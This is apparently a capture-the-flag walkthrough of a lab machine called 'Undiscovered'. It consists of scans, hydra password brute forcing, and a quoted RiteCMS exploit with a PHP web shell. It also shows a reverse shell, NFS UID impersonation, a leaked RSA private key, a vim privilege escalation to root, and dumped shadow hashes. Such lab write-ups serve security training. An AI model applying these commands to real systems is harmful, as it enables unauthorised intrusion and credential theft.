<p>June 24, 2025</p>
<h1>Undiscovered</h1>

![image](https://github.com/user-attachments/assets/db23cc4e-40b9-4212-a0a5-a3d67b214870)


<h2>rustscan</h2>

```bash
:~# rustscan -a 10.10.144.57 --ulimit 5000 -- -A -Pn
...
ORT      STATE SERVICE  REASON  VERSION
22/tcp    open  ssh      syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:76:81:49:50:bb:6f:4f:06:15:cc:08:88:01:b8:f0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0m4DmvKkWm3OoELtyKxq4G9yM29DEggmEsfKv2fzZh1G6EiPS/pKPQV/u8InqwPyyJZv82Apy4pVBYL7KJTTZkxBLbrJplJ6YnZD5xZMd8tf4uLw5ZCilO6oLDKH0pchPmQ2x2o5x2Xwbzfk4KRbwC+OZ4f1uCageOptlsR1ruM7boiHsPnDO3kCujsTU/4L19jJZMGmJZTpvRfcDIhelzFNxCMwMUwmlbvhiCf8nMwDaBER2HHP7DKXF95uSRJWKK9eiJNrk0h/K+3HkP2VXPtcnLwmbPhzVHDn68Dt8AyrO2d485j9mLusm4ufbrUXSyfM9JxYuL+LDrqgtUxxP
|   256 2b:39:d9:d9:b9:72:27:a9:32:25:dd:de:e4:01:ed:8b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAcr7A7L54JP/osGx6nvDs5y3weM4uwfT2iCJbU5HPdwGHERLCAazmr/ss6tELaj7eNqoB8LaM2AVAVVGQXBhc8=
|   256 2a:38:ce:ea:61:82:eb:de:c4:e0:2b:55:7f:cc:13:bc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII9WA55JtThufX7BcByUR5/JGKGYsIlgPxEiS0xqLlIA
80/tcp    open  http     syn-ack Apache httpd 2.4.18
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://undiscovered.thm
111/tcp   open  rpcbind  syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100021  1,3,4      32927/tcp6  nlockmgr
|   100021  1,3,4      34582/udp   nlockmgr
|   100021  1,3,4      41717/tcp   nlockmgr
|   100021  1,3,4      53479/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp  open  nfs      syn-ack 2-4 (RPC #100003)
41717/tcp open  nlockmgr syn-ack 1-4 (RPC #100021)
```

<h2>wfuzz</h2>

```bash
:~# wfuzz -u undiscovered.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.undiscovered.thm" --hc 404 --hw 26
...
000000492:   200        68 L     341 W    4584 Ch     "manager"                                               
000000517:   200        68 L     341 W    4626 Ch     "dashboard"                                             
000000567:   200        68 L     341 W    4584 Ch     "newsite"                                               
000000631:   200        68 L     341 W    4542 Ch     "forms"                                                 
000000634:   200        68 L     341 W    4668 Ch     "maintenance"                                           
000000523:   200        82 L     341 W    4650 Ch     "deliver"                                               
000000613:   200        68 L     341 W    4584 Ch     "develop"                                               
000000629:   200        68 L     341 W    4584 Ch     "network"                                               
000000666:   200        68 L     341 W    4521 Ch     "view"                                                  
000000675:   200        68 L     341 W    4605 Ch     "mailgate"                                              
000000679:   200        68 L     341 W    4521 Ch     "play"                                                  
000000681:   200        68 L     341 W    4542 Ch     "start"                                                 
000000686:   200        83 L     341 W    4599 Ch     "booking"                                               
000000692:   200        68 L     341 W    4605 Ch     "terminal"                                              
000000695:   200        68 L     341 W    4521 Ch     "gold"                                                  
000000697:   200        68 L     341 W    4605 Ch     "internet"                                              
000000703:   200        68 L     341 W    4626 Ch     "resources"                                             
000009543:   400        12 L     53 W     422 Ch      "#www"                                                  
000010595:   400        12 L     53 W     422 Ch      "#mail"                                                 
000047764:   400        12 L     53 W     422 Ch      "#smtp"                                                 
000103209:   400        12 L     53 W     422 Ch      "#pop3"      
```

<h2>/etc/hosts</h2>

```bash
TargetIP undiscovered.thm manager.undiscovered.thm deliver.undiscovered.thm
```

![image](https://github.com/user-attachments/assets/8361aed0-b96f-454c-b597-2ef7b1a68516)

![image](https://github.com/user-attachments/assets/3aa18ede-45c5-4486-93a2-111df851e797)

<h2>Exploit Database</h2>

![image](https://github.com/user-attachments/assets/6f6a1ea1-e6c7-4855-b4a7-82051eba9ef5)

![image](https://github.com/user-attachments/assets/24f569f7-4167-475b-989c-eb733221f1e7)

```bash
# Exploit Title: RiteCMS 2.2.1 - Authenticated Remote Code Execution
# Date: 2020-07-03
# Exploit Author: Enes Özeser
# Vendor Homepage: http://ritecms.com/
# Version: 2.2.1
# Tested on: Linux
# CVE: CVE-2020-23934

1- Go to following url. >> http://(HOST)/cms/
2- Default username and password is admin:admin. We must know login credentials.
3- Go to "Filemanager" and press "Upload file" button.
4- Choose your php web shell script and upload it. 
     
PHP Web Shell Code == <?php system($_GET['cmd']); ?>

5- You can find uploaded file there. >> http://(HOST)/media/(FILE-NAME).php
6- We can execute a command now. >> http://(HOST)/media/(FILE-NAME).php?cmd=id

(( REQUEST ))

GET /media/(FILE-NAME).php?cmd=id HTTP/1.1
Host: (HOST)
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://(HOST)/cms/index.php?mode=filemanager&directory=media
Connection: close
Cookie: icms[device_type]=desktop; icms[guest_date_log]=1593777486; PHPSESSID=mhuunvasd12cveo52fll3u
Upgrade-Insecure-Requests: 1


(( RESPONSE ))

HTTP/1.1 200 OK
Date: Fri, 06 Jul 2020 20:02:13 GMT
Server: Apache/2.4.43 (Debian)
Content-Length: 14
Connection: close
Content-Type: text/html; charset=UTF-8
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<h2></h2>

<h2>hydra></h2>

```bash
:~# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.144.57 http-post-form "/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong" -f
...
[DATA] attacking http-post-form://10.10.144.57:80/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong
[80][http-post-form] host: 10.10.144.57   login: admin   password: princess
[STATUS] attack finished for 10.10.144.57 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
...
```

```bash
:~# hydra -l admin -P /usr/share/wordlists/rockyou.txt deliver.undiscovered.thm http-post-form "/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong" -f
...
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://deliver.undiscovered.thm:80/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong
[80][http-post-form] host: deliver.undiscovered.thm   login: admin   password: liverpool
[STATUS] attack finished for deliver.undiscovered.thm (valid pair found)
1 of 1 target successfully completed, 1 valid password found
...
```

<h2>http://deliver.undiscovered.thm/cms/index.php?mode=filemanager&action=upload&directory=media</h2>

![image](https://github.com/user-attachments/assets/06795787-be4c-43c4-8f76-47a51a2badd0)

![image](https://github.com/user-attachments/assets/3cc541b0-e83d-453e-a0b3-ba4173d33acf)

![image](https://github.com/user-attachments/assets/846fec61-1e6d-4eb2-a278-ed6e17a9abd5)

![image](https://github.com/user-attachments/assets/35299161-559b-420c-acf6-cd2f02255ef7)

```bash
:~# nc -nlvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.144.57 43366
Linux undiscovered 4.4.0-189-generic #219-Ubuntu SMP Tue Aug 11 12:26:50 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 11:00:35 up 57 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@undiscovered:/$ ^Z
[1]+  Stopped                 nc -nlvp 9001
:~# stty raw -echo
:~# nc -nlvp 9001

www-data@undiscovered:/$ export TERM=xterm
www-data@undiscovered:/$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

/home/william	*(rw,root_squash)
www-data@undiscovered:/$ cat /etc/passwd | grep william
william:x:3003:3003::/home/william:/bin/bash
www-data@undiscovered:/$ 
```

```bash
:~# sudo useradd -u 3003 -d /dev/shm william
:~# cat /etc/passwd | grep william
william:x:3003:3003::/dev/shm:/bin/sh
root@ip-10-10-253-139:~# sudo su william
$ bash
william@ip-10-10-253-139:/root$ ls
48636.txt  burp.json   Desktop	  Instructions	Pictures  rev.php  Scripts  socat   thinclient_drives
48915.py   CTFBuilder  Downloads  mnt		Postman   Rooms    snap     ss.php  Tools
william@ip-10-10-253-139:/root$ cd mnt
william@ip-10-10-253-139:/root/mnt$ ls
admin.sh  script  user.txt
william@ip-10-10-253-139:/root/mnt$ cat user.txt
THM{8d7b7299cccd1796a61915901d0e091c}
william@ip-10-10-253-139:/root/mnt$ 
```


```bash
william@ip-10-10-253-139:/root/mnt$ ssh-keygen -f william
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in william
Your public key has been saved in william.pub
The key fingerprint is:
SHA256:+r9KN/HdCMg6nIErh7PrUjGeFEW5ObT4HJYrtJwvLio william@ip-10-10-253-139
The key's randomart image is:
+---[RSA 3072]----+
|     oo.         |
|    . o          |
|     + =         |
|    * O. . .     |
|   = X.+S + .    |
|    O.++ + o o o |
|   .+o+ * o . o .|
|E o .=.o o .     |
|o. ==o  ooo.     |
+----[SHA256]-----+
william@ip-10-10-253-139:/root/mnt$ cat ./william.pub > .ssh/authorized_keys
william@ip-10-10-253-139:/root/mnt$ chmod 600 william
william@ip-10-10-253-139:/root/mnt$ ssh -i william william@10.10.144.57
...
william@undiscovered:~$ ls -la
total 56
drwxr-x--- 5 william william 4096 Jun 25 11:11 .
drwxr-xr-x 4 root    root    4096 Sep  4  2020 ..
-rwxr-xr-x 1 root    root     128 Sep  4  2020 admin.sh
-rw------- 1 root    root       0 Sep  9  2020 .bash_history
-rw-r--r-- 1 william william 3771 Sep  4  2020 .bashrc
drwx------ 2 william william 4096 Sep  4  2020 .cache
drwxrwxr-x 2 william william 4096 Sep  4  2020 .nano
-rw-r--r-- 1 william william   43 Sep  4  2020 .profile
-rwsrwsr-x 1 leonard leonard 8776 Sep  4  2020 script
drwxrwxr-x 2 william william 4096 Jun 25 11:11 .ssh
-rw-r----- 1 root    william   38 Sep 10  2020 user.txt
-rw------- 1 william william 2610 Jun 25 11:10 william
-rw-r--r-- 1 william william  578 Jun 25 11:10 william.pub
william@undiscovered:~$ cat admin.sh
#!/bin/sh

    echo "[i] Start Admin Area!"
    echo "[i] Make sure to keep this script safe from anyone else!"
    
    exit 0
william@undiscovered:~$ file script
script: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6e324a50ee883a60b395cdd1c6a64f96e6546736, not stripped
william@undiscovered:~$ ./script
[i] Start Admin Area!
[i] Make sure to keep this script safe from anyone else!
william@undiscovered:~$ ./script testing
/bin/cat: /home/leonard/testing: No such file or directory
william@undiscovered:~$ ./script .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAwErxDUHfYLbJ6rU+r4oXKdIYzPacNjjZlKwQqK1I4JE93rJQ
HEhQlurt1Zd22HX2zBDqkKfvxSxLthhhArNLkm0k+VRdcdnXwCiQqUmAmzpse9df
YU/UhUfTu399lM05s2jYD50A1IUelC1QhBOwnwhYQRvQpVmSxkXBOVwFLaC1AiMn
SqoMTrpQPxXlv15Tl86oSu0qWtDqqxkTlQs+xbqzySe3y8yEjW6BWtR1QTH5s+ih
hT70DzwhCSPXKJqtPbTNf/7opXtcMIu5o3JW8Zd/KGX/1Vyqt5ememrwvaOwaJrL
+ijSn8sXG8ej8q5FidU2qzS3mqasEIpWTZPJ0QIDAQABAoIBAHqBRADGLqFW0lyN
C1qaBxfFmbc6hVql7TgiRpqvivZGkbwGrbLW/0Cmes7QqA5PWOO5AzcVRlO/XJyt
+1/VChhHIH8XmFCoECODtGWlRiGenu5mz4UXbrVahTG2jzL1bAU4ji2kQJskE88i
...
ZlBjwSWjfY9Hv/FMdrR6m8kXHU0yvP+dJeaF8Fqg+IRx/F0DFN2AXdrKl+hWUtMJ
iTQx6sR7mspgGeHhYFpBkuSxkamACy9SzL6Sdg8CgYATprBKLTFYRIUVnZdb8gPg
zWQ5mZfl1leOfrqPr2VHTwfX7DBCso6Y5rdbSV/29LW7V9f/ZYCZOFPOgbvlOMVK
3RdiKp8OWp3Hw4U47bDJdKlK1ZodO3PhhRs7l9kmSLUepK/EJdSu32fwghTtl0mk
OGpD2NIJ/wFPSWlTbJk77QKBgEVQFNiowi7FeY2yioHWQgEBHfVQGcPRvTT6wV/8
jbzDZDS8LsUkW+U6MWoKtY1H1sGomU0DBRqB7AY7ON6ZyR80qzlzcSD8VsZRUcld
sjD78mGZ65JHc8YasJsk3br6p7g9MzbJtGw+uq8XX0/XlDwsGWCSz5jKFDXqtYM+
cMIrAoGARZ6px+cZbZR8EA21dhdn9jwds5YqWIyri29wQLWnKumLuoV7HfRYPxIa
bFHPJS+V3mwL8VT0yI+XWXyFHhkyhYifT7ZOMb36Zht8yLco9Af/xWnlZSKeJ5Rs
LsoGYJon+AJcw9rQaivUe+1DhaMytKnWEv/rkLWRIaiS+c9R538=
-----END RSA PRIVATE KEY-----
william@undiscovered:~$ ./script .ssh/id_rsa > leonard
william@undiscovered:~$ chmod 600 leonard
william@undiscovered:~$ ssh -i leonard leonard@undiscovered
...
leonard@undiscovered:~$ getcap -r / 2>/dev/null
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/vim.basic = cap_setuid+ep
leonard@undiscovered:~$ 
leonard@undiscovered:~$ 
```

<p>https://gtfobins.github.io/gtfobins/vim/</p>

![image](https://github.com/user-attachments/assets/ceddb11e-9c7d-4527-a8da-ac0e680ee6f1)

```bash
leonard@undiscovered:~$ /usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
  _    _           _ _                                     _ 
 | |  | |         | (_)                                   | |
 | |  | |_ __   __| |_ ___  ___ _____   _____ _ __ ___  __| |
 | |  | | '_ \ / _` | / __|/ __/ _ \ \ / / _ \ '__/ _ \/ _` |
 | |__| | | | | (_| | \__ \ (_| (_) \ V /  __/ | |  __/ (_| |
  \____/|_| |_|\__,_|_|___/\___\___/ \_/ \___|_|  \___|\__,_|
      
             THM{8d7b7299cccd1796a61915901d0e091c}

# cat /etc/shadow
root:$6$1VMGCoHv$L3nX729XRbQB7u3rndC.8wljXP4eVYM/SbdOzT1IET54w2QVsVxHSH.ghRVRxz5Na5UyjhCfY6iv/koGQQPUB0:18508:0:99999:7:::
daemon:*:18484:0:99999:7:::
bin:*:18484:0:99999:7:::
sys:*:18484:0:99999:7:::
sync:*:18484:0:99999:7:::
games:*:18484:0:99999:7:::
man:*:18484:0:99999:7:::
lp:*:18484:0:99999:7:::
mail:*:18484:0:99999:7:::
news:*:18484:0:99999:7:::
uucp:*:18484:0:99999:7:::
proxy:*:18484:0:99999:7:::
www-data:*:18484:0:99999:7:::
backup:*:18484:0:99999:7:::
list:*:18484:0:99999:7:::
irc:*:18484:0:99999:7:::
gnats:*:18484:0:99999:7:::
nobody:*:18484:0:99999:7:::
systemd-timesync:*:18484:0:99999:7:::
systemd-network:*:18484:0:99999:7:::
systemd-resolve:*:18484:0:99999:7:::
systemd-bus-proxy:*:18484:0:99999:7:::
syslog:*:18484:0:99999:7:::
_apt:*:18484:0:99999:7:::
lxd:*:18508:0:99999:7:::
messagebus:*:18508:0:99999:7:::
uuidd:*:18508:0:99999:7:::
dnsmasq:*:18508:0:99999:7:::
sshd:*:18508:0:99999:7:::
mysql:!:18509:0:99999:7:::
statd:*:18509:0:99999:7:::
william:$6$Nxvi9UI5$h.yTVQCnXbfZ7BZT1sZnl4NHF074.uYC9o.1t61vSfHTJTdVBrdxib/QKXUlyOUkjk6FqusGuxCSIlJJsFyfY/:18509:0:99999:7:::
leonard:$6$mOYLO55O$oUzIfZpklQj8M4rumAa5UJWoA1KXBYEsQGAdtJliuJDvSAwweQdGi8bgbz.dDVZ63jUc/UX3/VXRwpCkEI5rQ/:18509:0:99999:7:::
nfsnobody:!:18510:0:99999:7:::
```


```bash
$6$1VMGCoHv$L3nX729XRbQB7u3rndC.8wljXP4eVYM/SbdOzT1IET54w2QVsVxHSH.ghRVRxz5Na5UyjhCfY6iv/koGQQPUB0
```

<br>

![image](https://github.com/user-attachments/assets/0ed81828-e59f-46d6-ae43-cba3e37f96c5)

![image](https://github.com/user-attachments/assets/0397b980-95ee-4331-93bc-6c759897d032)

<br>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| June 25, 2025     | 414      |     191st    |      6ᵗʰ     |     265ᵗʰ   |     6ᵗʰ    |  109,933 |    801    |     63    |

</div>

![image](https://github.com/user-attachments/assets/bbb2d2f9-da04-483e-9756-21ed9559c139)

![image](https://github.com/user-attachments/assets/29d9cbf5-3067-47ca-b7fd-7f578c74d1da)

![image](https://github.com/user-attachments/assets/b47c3732-57b3-436e-bf91-77b4639a3a4d)

![image](https://github.com/user-attachments/assets/53b78873-4028-4174-88a6-1100766c7592)


![image](https://github.com/user-attachments/assets/d608258e-c771-4eeb-9d56-bbcf149762fe)




